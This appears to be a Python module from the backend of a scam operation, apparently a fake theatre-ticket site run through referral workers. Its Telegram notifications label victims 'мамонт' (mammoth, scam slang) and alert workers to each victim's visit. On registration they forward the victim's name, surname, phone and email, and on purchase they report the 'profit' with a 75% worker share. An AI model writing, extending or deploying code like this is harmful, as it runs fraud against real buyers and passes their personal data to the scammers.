from typing import Optional
from ..config import logger
from data.db import db

# Assuming api.telegram_notify is available in PYTHONPATH
from api.telegram_notify import send_telegram_message

async def handle_visit_background(ref_code: str, ip: str, user_agent: str, visitor_id: Optional[str]):
    """Background task to record visit and notify owner."""
    if not ref_code:
        return

    logger.info(f"Processing visit for ref: {ref_code} (visitor_id={visitor_id})")
    
    row = await db.fetchone("SELECT id, chat_id FROM users WHERE referral_code = ?", (ref_code,))
        
    if not row:
        logger.warning(f"Ref owner not found for code: {ref_code}")
        return
        
    owner_id, chat_id = row['id'], row['chat_id']
    
    await db.execute(
        "INSERT INTO visits (referral_code, referral_owner_user_id, ip, user_agent, visitor_id) VALUES (?, ?, ?, ?, ?)",
        (ref_code, owner_id, ip, user_agent, visitor_id)
    )
    
    logger.info(f"Visit recorded for ref={ref_code}, notifying chat_id={chat_id}")
    await send_telegram_message(chat_id, "По твоей ссылке впервые перешли на сайт ✅")

async def notification_purchase(ref_owner_id: int, qty: int, total_price: int):
    row = await db.fetchone("SELECT chat_id FROM users WHERE id = ?", (ref_owner_id,))
    if row:
        chat_id = row['chat_id']
        msg = f"Покупка по твоей ссылке 🎟️: {qty} билета(ов), сумма {total_price}₽"
        logger.info(f"Sending purchase notification to chat_id={chat_id}")
        await send_telegram_message(chat_id, msg)

async def notify_mamont_visit(referrer_user_id: int, mamont_id: str):
    """Notify referrer about new mamont visit."""
    row = await db.fetchone("SELECT chat_id FROM users WHERE id = ?", (referrer_user_id,))
    if row and row['chat_id']:
        msg = f"<b>Новый мамонт!</b> <code>{mamont_id}</code>."
        logger.info(f"Notify mamont visit: referrer_user_id={referrer_user_id}, mamont_id={mamont_id}")
        await send_telegram_message(row['chat_id'], msg)

async def notify_mamont_registration(referrer_user_id: int, mamont_display: str, first_name: str, last_name: str, phone: str, email: str):
    """Notify referrer about mamont registration."""
    logger.info(f"Starting mamont registration notification: referrer_user_id={referrer_user_id}, mamont={mamont_display}")
    
    row = await db.fetchone("SELECT chat_id FROM users WHERE id = ?", (referrer_user_id,))
    if row and row['chat_id']:
        chat_id = row['chat_id']
        msg = (
            f"Мамонт {mamont_display} зарегистрировался на сайте.\n\n"
            f"<i>Данные:</i>\n"
            f"<code>Имя: {first_name}\n"
            f"Фамилия: {last_name}\n"
            f"Номер: {phone}\n"
            f"Почта: {email}</code>\n\n"
            f"<i>Для управления мамонтом перейдите в список мамонтов.</i>"
        )
        logger.info(f"Sending mamont registration notification to chat_id={chat_id}: referrer_user_id={referrer_user_id}, mamont={mamont_display}")
        await send_telegram_message(chat_id, msg)
    else:
        logger.warning(f"No chat_id found for referrer_user_id={referrer_user_id} during mamont registration notification")

async def notify_mamont_purchase(referrer_user_id: int, total: int, service: str = "Театр"):
    """Notify referrer about mamont purchase with 75% share."""
    acauser_total = int(total * 0.75)
    
    row = await db.fetchone("SELECT chat_id FROM users WHERE id = ?", (referrer_user_id,))
    if row and row['chat_id']:
        msg = (
            f"🚀 Новый профит!\n\n"
            f"┠ Сумма профита: {total}\n"
            f"┠ Твоя доля: {acauser_total}\n"
            f"┖ Сервис: {service}"
        )
        logger.info(f"Notify mamont purchase: referrer_user_id={referrer_user_id}, total={total}, acauser_total={acauser_total}")
        await send_telegram_message(row['chat_id'], msg)
